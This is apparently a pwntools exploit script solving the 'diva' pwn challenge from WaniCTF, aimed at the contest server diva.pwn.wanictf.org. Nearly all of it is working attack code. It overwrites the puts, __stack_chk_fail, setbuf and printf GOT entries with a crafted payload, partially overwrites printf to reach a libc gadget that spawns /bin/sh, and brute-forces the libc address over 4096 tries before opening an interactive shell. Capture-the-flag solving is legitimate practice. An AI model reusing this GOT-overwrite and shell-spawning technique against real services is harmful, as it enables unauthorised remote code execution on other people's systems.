from pwn import *

LOCAL = False
DEBUG = False

BINPATH = "./chall"
LIBCPATH = "./libc-2.31.so"
LDPATH = "./ld-2.31.so"

if DEBUG:
    IP = "127.0.0.1"
    PORT = 9000
else:
    IP = "diva.pwn.wanictf.org"
    PORT = 9008
    #IP = "127.0.0.1"
    #PORT = 9000


if DEBUG:
    context.log_level = "DEBUG" 
else:
    context.log_level = "ERROR"

binary = ELF(BINPATH)
libc = ELF(LIBCPATH)

def solve():
    if LOCAL:
        p = process([LDPATH, BINPATH], env={"LD_PRELOAD":LIBCPATH})
    else:
        p = remote(IP, PORT)

    if LOCAL and DEBUG:
        gdb.attach(p)

    if DEBUG:
        libc_base = int(raw_input(),16)
    else:
        libc_base = 0x12345000
    
    #.text:0000000000054F7B                 lea     rax, aC         ; "-c"
    #.text:0000000000054F82                 lea     rcx, aBinSh+5   ; "sh"
    #.text:0000000000054F89                 xor     edx, edx
    #.text:0000000000054F8B                 movq    xmm1, rax
    #.text:0000000000054F90                 movq    xmm0, rcx
    #.text:0000000000054F95                 lea     rdi, [rsp+398h+var_38C]
    #.text:0000000000054F9A                 mov     rax, cs:environ_ptr
    #.text:0000000000054FA1                 punpcklqdq xmm0, xmm1
    #.text:0000000000054FA5                 lea     r8, [rsp+398h+var_348]
    #.text:0000000000054FAA                 mov     rcx, rbp
    #.text:0000000000054FAD                 mov     [rsp+398h+var_338], rbx
    #.text:0000000000054FB2                 mov     r9, [rax]
    #.text:0000000000054FB5                 lea     rsi, aBinSh     ; "/bin/sh"
    #.text:0000000000054FBC                 movaps  [rsp+398h+var_348], xmm0
    #.text:0000000000054FC1                 mov     [rsp+398h+var_330], 0
    #.text:0000000000054FCA                 call    posix_spawn
    one_shot = 0x54F82

    #.text:00000000004018F9                 mov     [rbp+var_4], 0
    #.text:0000000000401900                 jmp     short loc_40196B
    init_for = 0x4018F9

    puts_got = 0x4036C0
    read_plt = 0x401140

    #0x000000000040101a : ret
    ret = 0x40101a

    p.recvuntil("Give me your code to send to the past")

    p.recvuntil(">")
    p.send(p64(0))
    p.recvuntil(">")
    p.send(p64(0))
    p.recvuntil(">")
    p.send(p64(0))

    p.recvuntil(">")

    payload = ""
    payload += p64(0) * 4
    payload += p64(0)
    payload += p64(0x20) # size
    payload += p64(puts_got) # write_target 
    
    p.send(payload)

    p.recvuntil(">")
    p.send(p64(0))

    p.recvuntil(">")

    payload = ""
    payload += p64(init_for) #puts
    payload += p64(ret) #__stack_chk_fail
    payload += p64(ret) #setbuf
    payload += p64(libc_base + one_shot)[:3] #printf

    p.send(payload)

    try:
        msg = p.recvline(timeout=0.2)
    except EOFError:
        print("wtf??")
        p.interactive()
    
    msg = ""
    
    if "(core dumped)" in msg or "terminated" in msg or "invalid" in msg or "failed" in msg:
        return

    print(msg)

    try:
        msg = p.recvline(timeout=0.2)
        if "(core dumped)" in msg or "terminated" in msg or "invalid" in msg or "failed" in msg:
            return
        p.interactive()
    except EOFError:
        return
    

if __name__ == "__main__":
    if DEBUG:
        solve()
    else:
        for i in range(1 << 12):
            print("%d"%i)
            solve()
